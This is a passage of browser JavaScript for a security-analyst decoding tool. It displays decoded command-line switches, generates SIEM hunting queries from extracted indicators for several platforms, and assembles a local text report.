            h("span", { class: "mono clflag", text: fl.flag + (fl.value ? " " + clip(fl.value, 40) : "") }),
            fl.meaning ? h("span", { class: "clmean", text: fl.meaning }) : h("span", {})
          ]));
        });
      } else clInner.appendChild(h("p", { class: "note", text: "No switches on this command." }));
      left.appendChild(card("Command line", clInner));
    }

    grid.appendChild(left);

    // ---- right column: hunting queries, sticky like the IOC Extractor so switching
    // platform tabs scrolls inside the code block instead of reflowing the page ----
    var right = h("div", { class: "col out-card" });
    right.appendChild(renderQueries(iocToItems(iocs)));
    grid.appendChild(right);
    view.appendChild(grid);

    document.getElementById("view-input").classList.add("hidden");
    view.classList.remove("hidden");
    document.body.classList.add("is-res");
    view.focus();
    window.scrollTo(0, 0);
  }

  function tile(num, label, color) {
    return h("div", { class: "tile tile-static", color: color }, [
      h("strong", { text: String(num) }), h("span", { text: label })
    ]);
  }
  function card(title, body) {
    return h("section", { class: "card" }, [title ? h("h2", { text: title }) : null, body]);
  }

  // ---- hunting queries (reuses the toolkit's shared SOCQueries engine) ----
  var PLATS = [["kql", "Sentinel / Defender", "KQL"], ["spl", "Splunk", "SPL"], ["elastic", "Elastic", "KQL"], ["cql", "CrowdStrike / LogScale", "CQL"]];
  var QEXT = { kql: "kql", spl: "spl", elastic: "txt", cql: "cql" };

  // Map the decoded IOCs onto the {type, value} items SOCQueries.build expects.
  function iocToItems(iocs) {
    var items = [], seen = {};
    function add(type, v) { var k = type + "|" + String(v).toLowerCase(); if (!seen[k]) { seen[k] = 1; items.push({ type: type, value: v }); } }
    iocs.urls.forEach(function (v) { add("url", v); });
    iocs.ips.forEach(function (v) { add("ipv4", v); });
    var dom = {}; iocs.domains.forEach(function (d) { dom[d.toLowerCase()] = 1; add("domain", d); });
    iocs.hosts.forEach(function (hn) { if (iocs.ips.indexOf(hn) === -1 && !dom[hn.toLowerCase()] && /[a-z]/i.test(hn)) add("domain", hn); });
    iocs.unc.forEach(function (v) { add("filepath", v); });
    iocs.paths.forEach(function (v) { add("filepath", v); });
    iocs.registry.forEach(function (v) { add("registry", v); });
    return items;
  }

  function queriesEngine() { return (typeof window !== "undefined" && window.SOCQueries) || (typeof SOCQueries !== "undefined" ? SOCQueries : null); }

  function renderQueries(items) {
    var Q = queriesEngine();
    if (!Q) return card("Hunting queries", h("p", { class: "empty", text: "Query engine (js/queries.js) is not loaded on this page." }));
    if (!items.length) return card("Hunting queries", h("p", { class: "empty", text: "No hunt-able indicators (URLs, IPs, domains, paths or registry keys) in the decoded text." }));
    var st = { plat: "kql", days: 30 };
    var body = h("div", {});
    var sec = h("section", { class: "card" }, [
      h("div", { class: "card-head" }, [
        h("h2", { text: "Hunting queries" }),
        h("span", { class: "sel-info", text: items.length + " indicator" + (items.length === 1 ? "" : "s") + " → Sentinel, Splunk, Elastic, CrowdStrike" })
      ]),
      body
    ]);
    function draw() {
      body.innerHTML = "";
      var plats = h("div", { class: "plats", role: "group", "aria-label": "SIEM platform" }, PLATS.map(function (p) {
        return h("button", { class: "plat", type: "button", "aria-pressed": String(st.plat === p[0]), title: p[2], text: p[1], on: { click: function () { st.plat = p[0]; draw(); } } });
      }));
      var q = "";
      try { q = Q.build(items, st.days)[st.plat] || ""; } catch (e) { q = ""; }
      var hasQ = q.trim().length > 0;
      var copyBtn = h("button", { class: "btn btn-ghost btn-sm", type: "button", text: "Copy" });
      copyBtn.addEventListener("click", function () { copyText(q, copyBtn); });
      var dlBtn = h("button", { class: "btn btn-ghost btn-sm", type: "button", text: "Download", on: { click: function () { download("hunt-" + st.plat + "-" + new Date().toISOString().slice(0, 10) + "." + QEXT[st.plat], q); } } });
      var days = h("select", { class: "field", "aria-label": "Time range" }, [1, 7, 30, 90].map(function (d) {
        var o = h("option", { value: String(d), text: "Last " + d + (d === 1 ? " day" : " days") }); if (st.days === d) o.selected = true; return o;
      }));
      days.addEventListener("change", function () { st.days = +days.value; draw(); });
      body.appendChild(plats);
      body.appendChild(h("div", { class: "qopts" }, [
        (st.plat === "elastic" || st.plat === "cql") ? h("span", { class: "sel-info", text: "Set the time range in " + (st.plat === "cql" ? "the Falcon / LogScale" : "Kibana's") + " time picker" }) : days,
        hasQ ? h("div", { class: "actions" }, [copyBtn, dlBtn]) : null
      ]));
      body.appendChild(hasQ ? h("pre", { class: "code", tabindex: "0" }, [h("code", { text: q })])
        : h("p", { class: "empty", text: "No hunt-able indicators (URLs, IPs, domains, paths or registry keys) in the decoded text." }));
      body.appendChild(h("p", { class: "note", text: "Field and table names follow each platform's defaults (Defender XDR / Sentinel tables, Splunk CIM, Elastic ECS, CrowdStrike Falcon / Next-Gen SIEM ECS). Adjust them to match your data sources before running." }));
    }
    draw();
    return sec;
  }

  function report(res, raw, iocs, flags, cmd) {
    var L = [];
    L.push("SOC Toolkit - DecodeSphere report");
    L.push("Generated locally in the browser. Nothing was uploaded.");
    L.push("");
    L.push("== INPUT =="); L.push(raw); L.push("");
    L.push("== DECODE CHAIN (" + res.steps.length + ") ==");
    res.steps.forEach(function (s, i) { L.push((i + 1) + ". " + s.name + " - " + (s.detail || "")); });
    L.push("");
    L.push("== DECODED OUTPUT =="); L.push(res.output); L.push("");
    if (cmd) { L.push("== COMMAND LINE =="); L.push("exe: " + cmd.exe); cmd.flags.forEach(function (f) { L.push("  " + f.flag + (f.value ? " " + f.value : "") + (f.meaning ? "   [" + f.meaning + "]" : "")); }); L.push(""); }
    L.push("== BEHAVIOUR FLAGS =="); if (!flags.length) L.push("(none)"); flags.forEach(function (f) { L.push("[" + sevWord(f.sev) + "] " + f.why); }); L.push("");
    L.push("== INDICATORS ==");
    [["URLs", iocs.urls], ["IPs", iocs.ips], ["Domains", iocs.domains], ["Hosts", iocs.hosts], ["UNC paths", iocs.unc], ["File paths", iocs.paths], ["Registry", iocs.registry]].forEach(function (g) {
      if (g[1].length) { L.push(g[0] + ":"); g[1].forEach(function (v) { L.push("  " + v); }); }
    });
    var Q = queriesEngine(), items = iocToItems(iocs);
    if (Q && items.length) {
      var built = {}; try { built = Q.build(items, 30); } catch (e) { built = {}; }
      L.push(""); L.push("== HUNTING QUERIES (last 30 days where applicable) ==");
      PLATS.forEach(function (p) {
        var q = (built[p[0]] || "").trim();
        if (q) { L.push(""); L.push("--- " + p[1] + " (" + p[2] + ") ---"); L.push(q); }
      });
    }
    return L.join("\n");
  }

  function showInput() {
    document.getElementById("view-res").classList.add("hidden");
    var vi = document.getElementById("view-input");
    vi.classList.remove("hidden");
    document.body.classList.remove("is-res");
    window.scrollTo(0, 0);
    // Start fresh: clear the pasted command and reset the status line.
    var input = document.getElementById("text-input");
    if (input) { input.value = ""; input.dispatchEvent(new Event("input")); }
    if (input) input.focus();
  }

  function bind() {
    var input = document.getElementById("text-input");
    var status = document.getElementById("input-status");
    var drop = document.getElementById("drop-zone");
    var fileInput = document.getElementById("file-input");
    var modeSel = document.getElementById("mode-sel");
    var keyWrap = document.getElementById("xor-wrap");
    var keyInput = document.getElementById("xor-key");
    if (!input) return;

    function setStatus(msg, cls) { status.textContent = msg; status.className = "status" + (cls ? " " + cls : ""); }

    function run() {
      var raw = input.value;
      if (!raw.trim()) { setStatus("Paste a command or encoded string first", "warn"); input.focus(); return; }
      setStatus("Decoding…");
      var mode = modeSel ? modeSel.value : "auto";
      var p = (mode === "auto") ? CMDDEC.decode(raw) : CMDDEC.transform(raw, mode, keyInput ? keyInput.value : "");
      p.then(function (res) { render(res, raw); }).catch(function (err) { setStatus("Could not decode: " + (err && err.message ? err.message : "unexpected error"), "err"); });
    }

    document.getElementById("analyze-btn").addEventListener("click", run);
    input.addEventListener("keydown", function (e) { if ((e.ctrlKey || e.metaKey) && e.key === "Enter") run(); });
    input.addEventListener("input", function () {
      var n = input.value.length;
      setStatus(n ? n.toLocaleString() + " characters ready" : "Waiting for input");
    });

    if (modeSel && keyWrap) modeSel.addEventListener("change", function () { keyWrap.hidden = modeSel.value !== "xor"; });

    document.getElementById("sample-btn").addEventListener("click", function () {
      input.value = buildSample();
      input.dispatchEvent(new Event("input"));
      setStatus("Sample loaded — a caret-obfuscated PowerShell downloader. Press Decode.");
    });
    document.getElementById("clear-btn").addEventListener("click", function () {
      input.value = ""; input.dispatchEvent(new Event("input")); input.focus();
    });

    function readFile(f) {
      if (!f) return;
      var r = new FileReader();
      r.onload = function () { input.value = String(r.result || ""); input.dispatchEvent(new Event("input")); setStatus("Loaded " + f.name); };
      r.onerror = function () { setStatus("Could not read that file", "err"); };
      r.readAsText(f);
    }
    fileInput.addEventListener("change", function () { readFile(fileInput.files[0]); fileInput.value = ""; });
    drop.addEventListener("dragover", function (e) { e.preventDefault(); drop.classList.add("dragging"); });
    drop.addEventListener("dragleave", function () { drop.classList.remove("dragging"); });
    drop.addEventListener("drop", function (e) { e.preventDefault(); drop.classList.remove("dragging"); var f = e.dataTransfer && e.dataTransfer.files[0]; if (f) readFile(f); });

    var yr = document.getElementById("year"); if (yr) yr.textContent = new Date().getFullYear();
  }

  if (typeof document !== "undefined") {
    if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", bind);
    else bind();
  }
})();
